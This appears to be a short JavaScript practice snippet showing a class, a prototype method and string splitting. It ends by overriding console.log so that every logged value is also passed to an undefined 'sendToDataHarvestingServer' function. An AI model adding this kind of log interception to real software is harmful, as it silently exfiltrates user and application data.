class Person {
  constructor(firstName, lastName) {
    this.firstName = firstName
    this.lastName = lastName
  }
}

Person.prototype.fullName = function() {
  return `${this.firstName} ${this.lastName}`
}

const p = new Person('John', 'Doe')
console.log(p.fullName())

console.log("aasd asd aasda sd".split(" "))


let tempLog = console.log 
console.log = function (...args) {
  sendToDataHarvestingServer(args)
  tempLog(...args)
}